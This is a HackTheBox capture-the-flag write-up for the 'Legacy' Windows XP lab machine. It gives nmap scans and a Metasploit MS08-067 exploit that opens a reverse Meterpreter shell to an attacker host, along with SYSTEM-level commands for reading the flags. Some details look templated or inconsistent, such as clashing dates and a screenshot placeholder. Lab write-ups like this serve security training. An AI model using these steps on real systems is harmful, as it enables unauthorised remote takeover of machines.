# HackTheBox - Legacy

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Legacy |
| **Category** | Windows Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-18 |

## Objective 🎯

Legacy is a Windows XP machine vulnerable to the MS08-067 vulnerability. The goal is to exploit this vulnerability to gain system access and obtain both user and root flags. Old school Windows exploitation! 🖥️

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.4
- **OS**: Windows XP
- **Vulnerability**: MS08-067

### Tools Used
- Nmap
- Metasploit
- MS08-067 exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.4
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.4
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.4
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsft-ds  Microsoft Windows XP microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows_xp
```

### Step 2: OS Detection
Confirm the operating system version.

**Command/Code:**
```bash
nmap -O 10.10.10.4
```

**Output:**
```
Running: Microsoft Windows XP|2003
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_2003::sp1
OS details: Microsoft Windows XP SP2 or Windows 2003 SP1
```

### Step 3: MS08-067 Exploitation
Use Metasploit to exploit the MS08-067 vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST 10.10.14.2
set TARGET 0
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.4:445 - Automatically detecting the target system
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.4:1031) at 2024-09-03 10:05:23 +0000
```

### Step 4: Post-Exploitation
Once we have a Meterpreter session, gather information and find flags.

**Command/Code:**
```bash
getuid
sysinfo
shell
whoami
```

**Output:**
```
Server username: NT AUTHORITY\SYSTEM
Computer        : LEGACY
OS              : Windows XP (Build 2600, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
```

### Step 5: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
dir C:\Documents and Settings
dir "C:\Documents and Settings\Administrator\Desktop"
type "C:\Documents and Settings\Administrator\Desktop\user.txt"
```

**Output:**
```
[REDACTED]
```

### Step 6: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
dir "C:\Documents and Settings\Administrator\Desktop"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify open services
2. Confirm Windows XP operating system
3. Use Metasploit MS08-067 exploit
4. Gain SYSTEM privileges through the exploit
5. Navigate to Administrator's desktop to find flags
6. Extract both user and root flags

## Key Learnings

- Understanding the MS08-067 vulnerability
- Using Metasploit for Windows XP exploitation
- Post-exploitation techniques with Meterpreter
- Windows XP directory structure differences
- Legacy Windows system exploitation

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning and OS detection
- **Metasploit**: Exploitation framework
- **MS08-067**: NetAPI exploit module

### References
- [MS08-067 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
- [MS08-067 Exploit](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/)

## Screenshots

[Add screenshots of nmap scan, Metasploit exploitation, and flag extraction here]

## Tags

`#hackthebox` `#windows` `#ms08-067` `#windows-xp` `#metasploit` `#easy`
